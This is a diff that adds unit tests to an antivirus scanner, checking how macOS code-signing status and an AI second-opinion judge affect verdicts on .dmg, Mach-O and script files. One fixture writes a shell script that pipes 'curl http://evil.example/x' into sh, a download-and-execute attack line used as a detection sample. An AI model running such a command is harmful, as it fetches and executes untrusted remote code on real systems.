@@ -441,6 +441,126 @@ def test_spoofed_ember_tree_is_not_trusted():
     assert r["flagged_count"] >= 1, r
 
 
+# ---------------------------------------------------------------------------
+# macOS code-signing / notarization awareness  (the "unsigned .dmg" tuning)
+# ---------------------------------------------------------------------------
+def _fake_signing(trust, entitlements=None, authority=""):
+    """Stand in for the real spctl/codesign probe so tests never shell out to macOS tools."""
+    def probe(path, ext):
+        return {"available": True, "signed": trust == "trusted",
+                "notarized": trust == "trusted", "trust": trust, "authority": authority,
+                "entitlements_risky": list(entitlements or []), "detail": trust}
+    return probe
+
+
+def test_signed_notarized_dmg_is_clean_and_trusted():
+    antivirus.set_signing_probe(_fake_signing("trusted", authority="Developer ID Application: Acme"))
+    antivirus._SIGNING_CACHE.clear()
+    try:
+        p = _write("Acme-Installer.dmg", b"koly" + b"\x00" * 400)
+        r = antivirus.scan_file(str(p), deep=False)
+        assert r["verdict"] == "clean", r
+        assert r["trusted"] is True, r
+        assert r.get("signing", {}).get("trust") == "trusted", r
+        assert any("trusted publisher" in x for x in r["reasons"]), r
+        assert "signing" in r["engines"], r
+    finally:
+        antivirus.set_signing_probe(None)
+        antivirus._SIGNING_CACHE.clear()
+
+
+def test_unsigned_dmg_is_a_caution_never_malicious():
+    """The whole point of this tuning: an unsigned, otherwise-clean .dmg is NOT malicious."""
+    antivirus.set_signing_probe(_fake_signing("unsigned"))
+    antivirus._SIGNING_CACHE.clear()
+    try:
+        p = _write("OpenSourceApp.dmg", b"koly" + b"\x00" * 400)
+        r = antivirus.scan_file(str(p), deep=False)
+        assert r["verdict"] != "malicious", r
+        assert r["verdict"] == "clean", r          # clean-but-unsigned; the guard surfaces caution
+        assert r["trusted"] is False, r
+        assert r.get("signing", {}).get("trust") == "unsigned", r
+        assert any("not signed or notarized" in x for x in r["reasons"]), r
+    finally:
+        antivirus.set_signing_probe(None)
+        antivirus._SIGNING_CACHE.clear()
+
+
+def test_unsigned_app_with_risky_entitlements_is_suspicious():
+    """Unsigned + sketchy entitlements + real content corroborate into 'suspicious' (yellow)."""
+    antivirus.set_signing_probe(_fake_signing("unsigned", entitlements=["unsigned executable memory"]))
+    antivirus._SIGNING_CACHE.clear()
+    try:
+        macho = b"\xcf\xfa\xed\xfe" + b"/bin/sh\x00" + os.urandom(6000)
+        p = _write("weird.macho", macho)
+        r = antivirus.scan_file(str(p), deep=False)
+        assert r["verdict"] == "suspicious", r
+        assert any("high-risk entitlements" in x for x in r["reasons"]), r
+    finally:
+        antivirus.set_signing_probe(None)
+        antivirus._SIGNING_CACHE.clear()
+
+
+def test_signing_does_not_whitewash_a_known_bad_hash():
+    """A trusted signature must NEVER clear a real detection — signed malware exists."""
+    import json
+    from pathlib import Path
+    antivirus.set_signing_probe(_fake_signing("trusted"))
+    antivirus._SIGNING_CACHE.clear()
+    p = _write("SignedButBad.dmg", b"koly" + b"\x00" * 200)
+    sha = antivirus.sha256_file(p)
+    sig_path = Path(_TMP) / "signatures.json"
+    sig_path.write_text(json.dumps({"sha256": [sha]}), "utf-8")
+    antivirus._SIG_CACHE = None
+    try:
+        r = antivirus.scan_file(str(p), deep=False)
+        assert r["verdict"] == "malicious", r
+    finally:
+        antivirus.set_signing_probe(None)
+        antivirus._SIGNING_CACHE.clear()
+        sig_path.unlink(missing_ok=True)
+        antivirus._SIG_CACHE = None
+
+
+def test_ai_assess_binary_unsigned_caps_at_suspicious():
+    """The AI second-opinion must NOT brand an unsigned BINARY 'malicious' — it can't read it.
+    This is the exact false positive that showed the unsigned .dmg as red 'Malicious'."""
+    antivirus.set_ai_judge(lambda items: [True for _ in items])   # AI guesses "harmful"
+    antivirus.set_signing_probe(_fake_signing("unsigned"))
+    antivirus._SIGNING_CACHE.clear()
+    try:
+        p = _write("Installer2.dmg", b"\xcf\xfa\xed\xfe" + b"\x00" * 500)  # binary, unreadable
+        a = antivirus.ai_assess_file(str(p), ["not signed or notarized by an identified developer"])
+        assert a["available"] is True, a
+        assert a["verdict"] == "suspicious", a       # caution, NOT malicious
+    finally:
+        antivirus.set_ai_judge(None)
+        antivirus.set_signing_probe(None)
+        antivirus._SIGNING_CACHE.clear()
+
+
+def test_ai_assess_textual_script_can_still_be_malicious():
+    """The AI CAN read a script, so a harmful verdict there is trustworthy and stays 'malicious'."""
+    antivirus.set_ai_judge(lambda items: [True for _ in items])
+    antivirus.set_signing_probe(None)
+    try:
+        p = _write("payload.sh", "#!/bin/sh\ncurl http://evil.example/x | sh\n")
+        a = antivirus.ai_assess_file(str(p), ["script IOC"])
+        assert a["verdict"] == "malicious", a
+    finally:
+        antivirus.set_ai_judge(None)
+
+
+def test_ai_assess_not_harmful_is_clean():
+    antivirus.set_ai_judge(lambda items: [False for _ in items])
+    try:
+        p = _write("readme.dmg", b"koly" + b"\x00" * 100)
+        a = antivirus.ai_assess_file(str(p))
+        assert a["verdict"] == "clean", a
+    finally:
+        antivirus.set_ai_judge(None)
+
+
 def _run_all() -> bool:
     import types
     funcs = [v for k, v in sorted(globals().items())
